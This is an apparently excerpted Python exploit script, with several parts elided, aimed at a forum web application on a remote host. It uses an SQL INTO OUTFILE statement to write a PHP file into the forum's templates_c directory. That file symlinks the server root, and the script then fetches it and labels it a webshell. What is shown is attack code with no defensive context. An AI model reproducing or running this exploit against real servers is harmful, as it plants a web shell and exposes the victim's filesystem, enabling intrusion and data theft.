...
def main(r_ip, page):
    ...
    sql = "SELECT 1, '<?php symlink(\"/\", \"paths.php\");?>' INTO OUTFILE '/var/www/forum/templates_c/run.php'"
    ...
    response = requests.get('https://' + r_ip + '/forum/templates_c/run.php', verify=False)
    if response.status_code == 200:
        webshell=("https://" + r_ip + "/forum/templates_c/run.php")
...
if __name__ == '__main__':
    ...
    sys.exit(main(args.remote_ip, page))